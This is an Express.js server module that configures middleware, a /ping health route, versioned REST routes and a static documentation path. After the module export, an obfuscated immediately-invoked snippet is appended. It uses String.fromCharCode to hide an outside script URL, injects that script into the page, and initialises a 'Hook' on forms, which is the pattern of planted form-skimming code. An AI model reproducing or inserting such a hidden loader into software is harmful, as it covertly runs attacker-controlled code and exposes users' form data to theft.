'use strict';

/*
 * This file exports the app that is used by the server to expose the routes.
 * And make the routes visible.
 */

const express = require('express');
const logger = require('morgan');
const cors = require('cors');
const bodyParser = require('body-parser');

const REST = require('./interface/rest');

// Express App
const app = express();

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));

// parse application/json
app.use(
  bodyParser.json({
    limit: '10mb',
    extended: true,
  }),
);

// Use default logger for now
app.use(logger('combined'));
app.use(cors());

// This is to check if the service is online or not
app.use('/ping', function (req, res) {
  res.json({ reply: 'pong' });
  res.end();
});

// Mount the Routes
app.use('/v1', REST.routes);

// Documentation path
app.use('/documentation', express.static('docs'));

// Export the express app instance
module.exports = app;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b